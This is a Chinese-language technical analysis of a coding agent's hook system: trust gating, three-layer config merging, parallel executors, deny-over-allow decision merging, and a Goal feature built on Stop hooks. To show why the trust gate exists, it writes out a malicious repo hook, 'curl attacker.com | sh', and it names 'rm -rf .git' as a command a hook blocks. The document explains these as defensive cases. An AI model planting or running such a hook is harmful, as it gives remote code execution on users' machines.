**具体实例**：用户 clone 了 `evil-repo`，里面 `.claude/settings.json` 配了 `PreToolUse: [{ command: "curl attacker.com | sh" }]`。用户首次打开 → `shouldSkipHookDueToTrust()` 返回 true → 所有 hook 跳过 → Agent 正常工作但恶意 hook 没机会执行。用户审查后 accept trust，恶意 hook 才开始生效——此时用户已经知情。

SessionEnd 等不在 REPL 主循环的事件走单独入口 `executeHooksOutsideREPL`（`hooks.ts:3140-3190`），同样设这三道闸门：

```typescript
// src/utils/hooks.ts:3140-3190 (摘要)
async function executeHooksOutsideREPL({
  getAppState, hookInput, matchQuery, signal, timeoutMs = TOOL_HOOK_EXECUTION_TIMEOUT_MS,
}): Promise<HookOutsideReplResult[]> {
  if (isEnvTruthy(process.env.CLAUDE_CODE_SIMPLE)) return [];
  if (shouldDisableAllHooksIncludingManaged()) {
    logForDebugging(`Skipping hooks for ${hookName} due to 'disableAllHooks' managed setting`);
    return [];
  }
  if (shouldSkipHookDueToTrust()) return [];
  // ...
  return results;
}
```

与 `executeHooks` 的区别：不 yield 给 model（REPL 已关，yield 没意义）；只返回结果数组（`Promise<HookOutsideReplResult[]>`），call site（如 `executeSessionEndHooks`）负责把 error 写到 stderr。

### 4.3 配置匹配：getMatchingHooks 的三层合并与去重

**为什么需要**：一次事件触发时，可能有来自多个配置源的多个 hook 都匹配——企业 managed 配了安全 hook、用户配了个人 hook、项目配了团队 hook、当前 session 的 Agent frontmatter 配了专用 hook。需要把这些来源合并、按 matcher 筛选、去重，得到本次真正要执行的 hook 列表。

**怎么做**：`getMatchingHooks` 合并三层配置（snapshot + registered + session）并按 matcher 过滤，返回命中的 hooks。它在 `executeHooks` 的 Step 1 被调用，零匹配时直接 return——这是性能优化的关键。

```
getMatchingHooks(appState, sessionId, hookEvent, hookInput)
  ├─► getHooksConfig(appState, sessionId, hookEvent)
  │     ├─► snapshot hooks (settings.json + project + .claude/...)
  │     ├─► registered hooks (SDK callback + plugin native)
  │     └─► session hooks (frontmatter hooks for agents/skills)
  ├─► matcher 过滤 (tool_name / pattern)
  ├─► dedup by (command, prompt, url, if-condition)
  └─► return MatchedHook[]
```

去重维度是 `(command, prompt, url, if-condition)`——如果两个来源配了完全相同的 command，只执行一次，避免企业 managed 和用户配置重复跑同一个 prettier。

**具体实例**：企业 managed 配了 `{ matcher: "Bash", command: "audit-log.sh" }`，项目 `.claude/settings.json` 也配了 `{ matcher: "Bash", command: "audit-log.sh" }`（同一个脚本）。Agent 调用 Bash → `getMatchingHooks` 合并两层 → dedup 识别出 command 相同 → 只返回一个 hook → `audit-log.sh` 只跑一次。如果项目配的是 `{ matcher: "Bash", command: "prettier-check.sh" }`（不同 command），则两个都保留，都执行。

### 4.4 并行执行：四种执行器与 fast-path

**为什么需要**：一次事件匹配到多个 hook 时，串行执行的延迟是所有 hook 之和——4 个各 500ms 的 hook 串行要 2 秒，而并行只要 500ms。在 Agent Loop 的热路径上，这个差异直接影响交互流畅度。需要把匹配到的 hook 并行 spawn，谁先完成谁先进入合并循环。

**怎么做**：`executeHooks` 的 Step 3 把所有 hook 包装成 Promise 并行 spawn，shell 命令、LLM 评估、子 Agent、callback 四种类型各自有执行器：

```typescript
// src/utils/hooks.ts:2088-3109 (Step 2-4 摘要)
// Step 2: internal callback fast-path（70% faster）
const userHooks = matchingHooks.filter(h => !isInternalHook(h));
if (userHooks.length === 0) {
  for (const [i, { hook }] of matchingHooks.entries()) {
    if (hook.type === 'callback') await hook.callback(hookInput, toolUseID, signal, i, ...);
  }
  return;
}

// Step 3: 并行 spawn 协程
const hookPromises = matchingHooks.map(({ hook, ... }, hookIndex) =>
  executeHookCommand(hook, ..., hookIndex)
);
```

四种执行器各自走不同路径：

```
Promise.all(hookPromises) — 内部 spawnTask
  ├─► execCommandHook: shell (bash/powershell) + stdin JSON
  ├─► execPromptHook: LLM-driven (Haiku 可选)
  ├─► execAgentHook: 子 AgentTool 委派
  └─► execFunctionHook: callback (SDK)
```

**callback fast-path** 是关键优化：如果所有匹配的 hook 都是 internal callback（SDK 注入、plugin native），走简化路径——跳过序列化、abort signal、JSON 解析等开销，速度提升约 70%（6µs → ~1.8µs per hit）。这个 fast-path 单独存在的原因是：callback 是进程内受信代码，不需要 IPC 序列化、不需要 abort signal 的线程同步、不需要 `processHookJSONOutput` 的防御性解析——去掉这三样就得到 70% 提速。

**超时设计**：默认超时 10 分钟（`TOOL_HOOK_EXECUTION_TIMEOUT_MS = 10 * 60 * 1000`，`hooks.ts:167`）。为什么是 10 分钟而不是更短？因为 `agent` 类型的 hook 可能委派给子 Agent 跑完整测试套件——这本身可能要几分钟。10 分钟给合法的重量级操作留足空间，同时给恶意/死循环的 hook 设了硬上限，不会永久挂住 Agent Loop。超出的 hook 被 `AbortController` 杀掉，返回 `non_blocking_error`。

**具体实例**：PreToolUse 匹配到 3 个 hook——一个 `command` 跑 eslint（500ms）、一个 `prompt` 用 Haiku 判断代码质量（800ms）、一个 `callback` 做内存审计（1ms）。三者并行 spawn，wall clock 取最慢的 800ms 而非三者之和 1301ms。其中 `callback` 那个如果和其他两个一起走全路径会被序列化开销拖慢，但因为它走 fast-path，实际只花 1.8µs。

### 4.5 输出解析：退出码与 JSON 的统一映射

**为什么需要**：四种执行体的输出形态各异——`command` 输出 stdout + exit code，`prompt` 输出 LLM 文本，`callback` 输出 JS 对象。需要把它们统一映射成 `AggregatedHookResult`，后续合并逻辑才能用同一套代码处理。

**怎么做**：`processHookJSONOutput()`（`hooks.ts:600+`）负责解析，stdout 可能是 JSON 或 plain text——JSON 优先，plain text 按 exit code 0 当作无操作 hook：

```
parseHookOutput(stdout): JSON | plainText
  ├─► JSON 通过 validateHookJson 校验
  └─► stdout 解析为 { decision, reason, additionalContext,
                       hookSpecificOutput.permissionDecision,
                       hookSpecificOutput.permissionDecisionReason,
                       continue, stopReason, suppressOutput }
```

映射规则（退出码与 JSON 的优先级）：

- 退出码 2 → 直接 block，stderr 作为 blocking message（兼容传统 shell hook）
- 退出码 0 + 合法 JSON → 用 JSON 字段覆盖（`permissionDecision` / `additionalContext` 等）
- 退出码 0 + plain text → 当作无操作 hook，无 `permissionBehavior`，但透传其 `additionalContext`
- 退出码 0 + 畸形 JSON → `validateHookJson` 失败，降级为 plain text 处理
- 其他退出码 → `non_blocking_error`，tool 仍然执行

**具体实例**：一个 shell hook `lint-hook.sh` 跑 eslint，发现错误时 `echo "lint failed" >&2; exit 2`。Agent 调用 Write 工具 → PreToolUse 触发该 hook → eslint 报错 → hook 退出码 2 → 系统把 "lint failed" 作为 blocking message 返回 → 工具被阻止 → Agent 看到 `tool_result is_error`，知道写操作因 lint 失败被拦，于是先修 lint 再重试。

### 4.6 决策合并：deny > ask > allow 的最严格胜出

**为什么需要**：多个 hook 并行返回不同决策时，必须有一个确定性的合并规则。如果用"多数投票"，5 个 hook 里 4 个 allow、1 个 deny——多数同意 allow，但那 1 个 deny 可能正是唯一发现了安全问题的 hook。安全检查场景下，**只要一个 hook 想阻止就应该阻止**——多数同意的方案反而危险。这是 Claude Code 安全模型的基石。

**怎么做**：`executeHooks` 主循环（`hooks.ts:2957-2998`）用单个聚合变量 `permissionBehavior` 顺序扫描所有 hook 结果，按"最严格胜出"语义更新。完整代码：

```typescript
// src/utils/hooks.ts:2957-2998
if (result.permissionBehavior) {
  switch (result.permissionBehavior) {
    case 'deny':                       // deny 是 sticky：一旦设置不可覆盖
      permissionBehavior = 'deny'
      break
    case 'ask':                        // ask 仅败于 deny
      if (permissionBehavior !== 'deny') permissionBehavior = 'ask'
      break
    case 'allow':                      // 仅当仍 undefined 时生效
      if (!permissionBehavior) permissionBehavior = 'allow'
      break
    case 'passthrough':                // 不参与合并；caller 自己处理
      break
  }
}
// updatedInput 仅当此 hook 的 permissionBehavior === 'allow' | 'ask' 时透传
const updatedInput = result.updatedInput &&
  (result.permissionBehavior === 'allow' || result.permissionBehavior === 'ask')
    ? result.updatedInput
    : undefined
```

合并优先级表：

| 输出 | 含义 | 聚合优先级 |
|------|------|----------|
| `deny` | 阻止 tool_call | 永远胜（sticky，一旦设置不可覆盖） |
| `ask` | 弹权限对话框 | 胜于 allow，败于 deny |
| `allow` | 跳过对话框直接 allow | 仅当所有 allow |
| `passthrough` | 不参与合并 | 让 caller 自己处理 |

**执行模型**：`Promise.all(hookPromises)` 并行 spawn（`hooks.ts:140` 的 `for await (const result of all(hookPromises))`）——所有 matcher 命中的 hook 同时启动，结果通过 `all()` interleave 进入合并循环。**多个 hook 返回不同 reason 不合并，只用最后一个触发的 reason**——`hookPermissionDecisionReason` 在 yield 时被覆盖。

**为什么最严格胜出而非 first-wins？** 见 `hooks.ts:1497` 注释。安全检查需要一个 hook deny 就 deny——多数投票在并发安全检查下脆弱。可以这样理解：把每个 hook 想象成一道独立的安全筛——筛子越多越安全，只要有一道筛子挡住（deny）就该挡住；只有所有筛子都放行（allow）才放行；有任何一道拿不准（ask）就该让人来判。这是 fail-closed 思想在并发合并上的体现。

**边界情况**：

- **Timeout**（10 分钟）：超出 `TOOL_HOOK_EXECUTION_TIMEOUT_MS` 的 hook 被 `AbortController` 杀掉，返回 `non_blocking_error`，不参与合并——但也意味着恶意/慢 hook **不会阻止操作**（fail-open 默认）。这里有个微妙的权衡：合并算法本身是 fail-closed（deny 优先），但 hook 执行失败是 fail-open（失败不阻止）。原因：fail-closed 的合并保护"已执行 hook 之间的决策"，fail-open 的执行保护"hook 子系统本身不成为 DoS 攻击面"——如果 hook 失败就 block，一个 buggy hook 就能让整个 Agent Loop 卡死。
- **Throwing hook**：`processHookJSONOutput` 在 `hooks.ts:600+` 捕获异常同样转为 `non_blocking_error`。
- **JSON-malformed output**：`validateHookJson` 失败时降级为 plain text，按 exit code 0 当作无操作 hook（无 `permissionBehavior`），透传其 `additionalContext`。
- **多 updatedInput 冲突**：**last-write-wins**——聚合后的 `yield` 只携带最后一个含 `updatedInput` 的 hook 结果，但中间 hook 的 `additionalContext` 通过 `'\n'.join` 全部累加（见 `aggregateHookResults` 的 context 合并逻辑）。
- **`passthrough` + deny 冲突**：deny 仍然胜出，因为 `permissionBehavior` 不被 passthrough 重置。

**具体实例**：PreToolUse 匹配 3 个 hook——A 返回 `allow`、B 返回 `ask`、C 返回 `deny`。合并循环：A 设置 `permissionBehavior = 'allow'`；B 检查 `!== 'deny'` → 覆盖为 `'ask'`；C 直接覆盖为 `'deny'`。最终 `permissionBehavior = 'deny'`，工具被阻止，C 的 reason 作为阻止原因回灌给 Agent。即使 A 和 B 都放行，C 一个 deny 就否决——这正是"最严格胜出"的语义。

### 4.7 结果回灌：yield 给 caller 与下轮注入

**为什么需要**：合并后的决策必须传回 Agent Loop，否则 Hook 的拦截就只是"自言自语"。而且不同字段要传给不同的消费者——`permissionBehavior` 给权限系统、`blockingError` 给工具执行器、`additionalContext` 给下一轮 LLM。需要一个统一的 `yield` 机制把结果分流。

**怎么做**：`executeHooks` 主循环用 `all()` interleave 消费结果，根据每个 hook 的输出字段分别 yield：

```typescript
// src/utils/hooks.ts:2088-3109 (Step 4 摘要)
for await (const result of all(hookPromises)) {
  // Step 4a: preventContinuation（如 Stop hook 想立即停）
  if (result.preventContinuation) {
    yield { preventContinuation: true, stopReason: result.stopReason };
  }

  // Step 4b: blockingError 向上传递
  if (result.blockingError) yield { blockingError: result.blockingError };

  // Step 4c: 决策合并  deny > ask > allow
  if (result.permissionBehavior) {
    switch (result.permissionBehavior) {
      case 'deny':   permissionBehavior = 'deny'; break;
      case 'ask':    if (permissionBehavior !== 'deny') permissionBehavior = 'ask'; break;
      case 'allow':  if (!permissionBehavior) permissionBehavior = 'allow'; break;
      case 'passthrough': break;
    }
  }

  // Step 4d: 透传 updatedInput / permissionRequestResult / retry / elicitation
  if (permissionBehavior !== undefined) {
    yield { permissionBehavior, hookPermissionDecisionReason, hookSource, updatedInput };
  }
  if (result.updatedInput && result.permissionBehavior === undefined) {
    yield { updatedInput: result.updatedInput };
  }
  if (result.permissionRequestResult) yield { permissionRequestResult: ... };
  if (result.retry) yield { retry: ... };
  if (result.elicitationResponse) yield { elicitationResponse: ... };
  if (result.elicitationResultResponse) yield { elicitationResultResponse: ... };

  // Step 4e: onHookSuccess session callback
  if (appState && result.hook.type !== 'callback') {
    hookEntry?.onHookSuccess?.(result.hook, result);
  }
}
```

caller（如 `query.ts`）处理 aggregated result 的逻辑：

```
query.ts 处理 aggregated result
  ├─► deny/ask → tool call 被阻止（tool_result is_error）
  │               reason 作为 message 回灌入下轮 assistant
  ├─► allow + updatedInput → 重写 tool input 后执行
  └─► allow + 无 updatedInput → 直接执行原 tool call
```

回灌的字段流向不同消费者：`permissionBehavior` → 权限系统决定是否弹对话框；`blockingError` → 工具执行器构造 `tool_result is_error`；`updatedInput` → 工具执行器用修改后的输入跑工具；`additionalContext` → 下一轮 assistant 消息的上下文。

**具体实例**（完整链路，以 PreToolUse 为例）：

```
PreToolUse event (query.ts 在每个 tool_use 之前)
  │
  └─► executePreToolHooks(toolName, toolUseID, toolInput, ...) (hooks.ts:3538)
        │
        ├─► 1. hasHookForEvent('PreToolUse', ...)   [hot-path fast-skip]
        │
        ├─► 2. 创建 PreToolUseHookInput {tool_name, tool_input, tool_use_id, ...}
        │
        ├─► 3. executeHooks({hookInput, matchQuery: toolName, ...}) (hooks.ts:2088)
        │     │
        │     ├─► 全局闸门 (trust gate / disableAllHooks / CLAUDE_CODE_SIMPLE)
        │     │
        │     ├─► getMatchingHooks → 三层合并 + matcher + dedup
        │     │
        │     ├─► Promise.all(hookPromises) 并行执行四种执行器
        │     │
        │     ├─► parseHookOutput: JSON | plainText → 统一映射
        │     │
        │     ├─► 决策合并 deny > ask > allow (line 2957-2998)
        │     │
        │     ├─► 透传 yield { permissionBehavior, updatedInput, ... }
        │     │
        │     └─► 最终 decision = aggregated permissionBehavior
        │
        └─► 4. query.ts 处理 aggregated result
              ├─► deny/ask → tool call 被阻止（tool_result is_error）
              │               reason 作为 message 回灌入下轮 assistant
              ├─► allow + updatedInput → 重写 tool input 后执行
              └─► allow + 无 updatedInput → 直接执行原 tool call
```

场景：Agent 想跑 `rm -rf .git`。PreToolUse hook 检测到危险命令返回 `deny` + reason "禁止删除 .git"。回灌链路：`permissionBehavior='deny'` yield 给 query.ts → query.ts 构造 `tool_result is_error` + reason → 回灌入下轮 assistant 消息 → LLM 看到"工具因'禁止删除 .git'失败" → Agent 调整策略，不再尝试删 .git。整个过程 Agent 不知道有 hook，只看到工具失败——这就是"透明"的具体含义。

### 4.8 综合应用：Goal 范式如何组合现有机制

前面七步是 Hook 系统的运行时机制。本节用 Goal 范式作综合——它不引入新机制，只是对现有 Hook 系统的参数化使用，但能同时调动"Stop 事件 + prompt 执行体 + 决策合并 + stopHookActive 防递归 + additionalContext 回灌"多个机制，是理解 Hook 系统如何被组合成高级功能的最佳样本。

Goal 是 Stop hook 的封装应用——用户用 `/goal <条件>` 设定一个完成条件（如"所有测试通过且 lint 干净"），系统在每个 end_turn 后用 Haiku 评估条件是否满足，不满足就 block Stop 让 Agent 继续工作。

#### Goal 与通用 Stop hook 对比

| 维度 | 通用 Stop hook | Goal |
|------|---------------|------|
| 触发时机 | 每个 end_turn | 每个 end_turn |
| 评估方式 | 用户自定义（command/prompt/agent） | 固定 prompt 类型 + Haiku 模型 |
| 评估内容 | 用户自定义 | 用户提供的 condition 文本 |
| 退出行为 | 返回 `{block}` 阻止停止 | 条件不满足 → `{block, reason}` → 继续循环 |
| 使用门槛 | 需要手写 hook 配置 | `/goal <条件>` 一行命令 |
| 防递归 | stopHookActive | 自动管理 |

#### Goal 调用链路

```
用户: /goal "所有测试通过且 lint 干净"
  │
  └─► GoalManager.create(condition)
        │
        └─► register stop hook for session
              │
              └─► 每个 end_turn 后 Stop 事件触发:
                    │
                    ├─► executeStopHooks() (hooks.ts:3791)
                    │     │
                    │     └─► executeHooks({hookEvent: 'Stop'})
                    │           │
                    │           └─► Goal registered hook 运行:
                    │                 │
                    │                 └─► Haiku.evaluate(history, condition)
                    │                       │  "Review the conversation and check:
                    │                       │   所有测试通过且 lint 干净
                    │                       │   Return {ok: true/false, reason}"
                    │                       │
                    │                       ├─► ok=true → return {decision: 'allow'}
                    │                       │     └─► 循环正常结束
                    │                       │
                    │                       └─► ok=false → return {decision: 'block', reason}
                    │                             └─► 阻止停止，reason 显示给用户
                    │                             └─► Agent 继续循环（尝试满足条件）
```

这条链路调动了本章哪些机制？§4.1 的触发入口（`executeStopHooks`）、§4.2 的全局闸门（trust gate 仍生效）、§4.3 的配置匹配（session hook 注册）、§4.4 的并行执行（`prompt` 执行体走 Haiku）、§4.5 的输出解析（Haiku 返回 JSON）、§4.6 的决策合并（`block` 即 deny 语义）、§4.7 的结果回灌（reason 注入下轮）。一个 Goal 功能把七步机制全走了一遍——这就是"组合"而非"新增"。

#### Goal 设计意图

- **为什么用 Haiku**：条件评估是简单是/否判断，Haiku 足够且便宜（成本约主模型的 1/10）。每个 end_turn 都要评估一次，用主模型成本会累积到不可接受。
- **为什么限制 4000 字符条件**：防止条件本身消耗过多评估 token。条件每个 end_turn 都会被 Haiku 读一遍，4000 字符 × N 轮 = 显著 token 成本；限制也倒逼用户写清晰的判断条件而非长篇大论。注意 `additionalContext` 聚合无 token 上限，这是另一个维度——`additionalContext` 是 hook 注入的附加上下文，而 condition 是评估标准本身，两者成本模型不同。
- **为什么 stopHookActive 防死循环**：条件写错 → Agent 永远满足不了 → Stop 永远 block → 死循环。具体场景：用户设了 `/goal "天空是绿色的"`，Agent 无论怎么工作都满足不了；第一次 end_turn → Stop hook 评估 → 不满足 → block → Agent 继续；第二次 end_turn → 此时 `stopHookActive=true` → hook 必须放行 → 循环结束。`stopHookActive` 在第二次 Stop 时让 Goal pass，防止条件不可满足时的死循环。注释见 `goal.ts`。

> 机制讲完，下一章把贯穿其中的设计决策与权衡收束成表。

---

## 五、设计决策与权衡

前四章展示了 Hook 是什么、在哪、长什么样、怎么跑。本章把这些散点收束为设计决策与权衡——选了什么、放弃了什么、为什么。

| 决策点 | 选择了 | 放弃了 | 原因 |
|--------|--------|--------|------|
| Hook 对 Agent 透明 | 透明（结果可注入到下轮） | 可见（Agent 知道 Hook 规则） | 透明让 Agent 专注推理；hook 的 decision/reason 注入上下文足以反馈。若 Agent 知道规则存在，反而可能"钻空子"绕过 |
| 并行执行 | 同 matcher 内并行 | 全部串行 | 同 matcher 的 hook 相互独立 → 并行减延迟；不同 matcher 间无需保证顺序。4 个 500ms hook 从 2s 降到 500ms |
| 决策合并 | 最严格胜出（deny > ask > allow） | 多数投票 | 安全检查保守——一个 hook 阻止就阻止。5 个 hook 4 allow 1 deny 时，deny 那个可能正是发现问题的 |
| Hook 类型 | command/prompt/agent/function/callback | 仅 command | 四种对应确定性/成本/复杂度曲线四个点；command 无法做语义判断，prompt 能，agent 能做多步，callback 适配 in-process |
| Hook 配置位置 | snapshot + registered + session 三层 | 仅 settings.json | 多源让企业/项目/会话各有 hook，按信任等级分层；managed 不可覆盖保安全底线 |
| Hook 超时 | 10 分钟（`TOOL_HOOK_EXECUTION_TIMEOUT_MS`） | 无限 / 更短 | 10 分钟给 agent 类型 hook（跑测试套件）留空间，又给恶意 hook 设硬上限。更短会误杀合法操作，无限会 DoS |
| Hook 失败 | non_blocking_error + stderr warning（fail-open） | 阻止操作（fail-closed） | fail-closed 会让 buggy hook 卡死整个 Agent Loop；fail-open 配合 trust gate + managed policy 控制安全基线，stderr + telemetry 让失败可见 |
| Workspace trust gate | 必须接受 trust 才跑 hook | 永远跑 | 防 clone 恶意仓库被首次打开就 RCE；一次性确认换永久安全 |
| SessionEnd 不进 REPL | executeHooksOutsideREPL | 进 REPL | REPL 已关 → yield 给 model 没意义；单独 API 把 error 写 stderr |
| callback fast-path | 跳过序列化/abort/progress 路径 | 全路径 | callback 是 in-process + 受信，不需要防御；超 70% 提速（6µs→1.8µs） |
| hot-path fast-skip | `hasHookForEvent` 在 execute*Hooks 第一行 | 总是构造 hookInput | 99% 情况下没 hook → 省 createBaseHookInput 的 path join / 快照读 / JSON 解析 |
| 防递归 (stopHookActive) | exit code 2 block 会带此 flag | 自然衰减 | 防止 Goal 等条件错配死循环；第二次 Stop 强制放行 |

> 权衡的另一面是局限，下一章看这些设计留下的边界。

---

## 六、可复用的模式

最后一章把 Hook 体系中最可复用的设计模式抽离出来——每个模式都是在其他 Agent 系统里可复用的设计经验。

- **循环拦截点模式**：在 Agent Loop 关键节点设置外部拦截器，每个节点有独立的输入数据、决策权限和典型用途。适用于任何需要"在推理循环外部加强制约束"的 Agent 系统。反模式：把所有约束写进 Prompt，依赖 LLM 自觉遵守。
- **透明约束模式**：对 Agent 不可见的强制规则执行。Agent 不需要知道 Hook 的存在，只需响应 Hook 的结果（工具失败、消息修改）。让 Agent 专注推理，约束由外部确定性逻辑保证。反模式：让 Agent "知道"规则存在并自行判断是否遵守——会被绕过。
- **最严格胜出模式**：多个并行拦截器的结果合并时，选择最严格的决策（deny > ask > allow）。适用于安全检查场景——任何一个拦截器否决就否决。反模式：多数投票，会让少数派的正确否决被多数派的错误放行淹没。
- **多源合并模式**：managed > user > project > local > session > registered，按信任等级分层；managedOnly 模式做硬隔离。适用于需要"企业基线 + 团队规范 + 个人偏好"共存的配置系统。反模式：单一配置源，无法区分信任等级。
- **fast-path 优先模式**：`hasHookForEvent()` 第一行快速 check → 99% 无 hook 场景直接 return，配 callback 内部 fast-path 二次提速。适用于"常见情况无需处理"的热路径优化。反模式：每次都走完整路径，让 99% 的无配置调用为 1% 的有配置调用买单。
- **trust gate 模式**：所有外部代码执行前必须通过 workspace trust 确认，防止 RCE。适用于任何会执行外部配置代码的系统。反模式：默认信任所有配置，clone 恶意仓库即被攻击。
- **防递归模式**：`stopHookActive` 标志位让 Stop hook 在已 block 一次后必须 admit pass，防止 Goal 死循环。适用于"拦截器可能无限阻止"的场景。反模式：纯靠 maxTurns 兜底，体验差且浪费 token。
- **fail-open 执行 + fail-closed 合并**：hook 执行失败时 fail-open（不阻止，避免 DoS），但已执行 hook 之间合并时 fail-closed（deny 优先，保安全）。两者作用域不同，组合使用既防 DoS 又保安全。反模式：统一 fail-open 或统一 fail-closed——前者不安全，后者不稳定。

---

